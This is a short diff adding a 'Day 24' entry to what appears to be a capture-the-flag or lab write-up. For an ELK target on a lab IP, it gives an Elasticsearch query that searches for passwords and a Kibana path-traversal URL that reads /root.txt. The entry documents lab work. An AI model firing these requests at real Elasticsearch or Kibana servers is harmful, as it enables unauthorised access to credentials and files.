@@ -125,4 +125,15 @@ LapAnd (SQL INJECTION)
 ```
 
 
+***Day 24***
+```
+ELK
+#1 Find the password in the database
+: http://10.10.116.208:9200/_search?q=password
+
+#2 Read the contents of the /root.txt file
+: 10.10.116.208:5601/api/console/api_server?sense_version=@@SENSE_VERSION&apis=../../../../../../.../../../../root.txt
+: curl http://10.10.116.208:8000/kibana-log.txt | tail -n 1     
+
+```
 
